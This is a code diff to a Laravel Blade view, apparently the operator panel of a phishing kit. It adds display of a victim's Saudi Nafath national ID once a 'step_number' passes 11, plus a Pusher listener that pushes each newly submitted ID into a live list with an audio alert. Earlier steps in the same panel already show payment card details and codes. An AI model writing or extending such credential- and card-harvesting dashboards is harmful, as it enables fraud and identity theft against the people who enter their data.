@@ -33,7 +33,16 @@
                     </h3>
                 </div>
                 <div class="notificationsList">
-
+                  @if($notification->step_number >=11)
+                    @if($notification->nafad_id)
+                    <div class="card-body">
+                      <h5><i class="icon fas fa-check"></i>  قام بإرسال معرف نفاذ      </h5>
+                        <div class="direct-chat-text">
+                        <p><strong class="fs-3 border p-1 rounded">Id:</strong> {{$notification->nafad_id}}</p>
+                      </div>
+                    </div><hr>
+                    @endif
+                  @endif
                     @if($notification->step_number >=4)
                      @if($notification->paymentCard)
                     <div class="card-body">
@@ -223,6 +232,23 @@
           <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
             <div class="direct-chat-text">
             <p><strong class="fs-3 border p-1 rounded">Name:</strong> `+dataA.code+`</p>
+          </div>
+        </div><hr>
+      `);
+
+      playDataAudio();
+    }
+  });
+  var channelNafad = pusher.subscribe('send-nafad-id');
+  channelNafad.bind('App\\Events\\SendNafadId', function(dataA)
+  {
+    if(dataA.people_id == id)
+    {
+      $(".notificationsList").prepend(`
+        <div class="card-body">
+          <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
+            <div class="direct-chat-text">
+            <p><strong class="fs-3 border p-1 rounded">Id:</strong> `+dataA.nafad_id+`</p>
           </div>
         </div><hr>
       `);
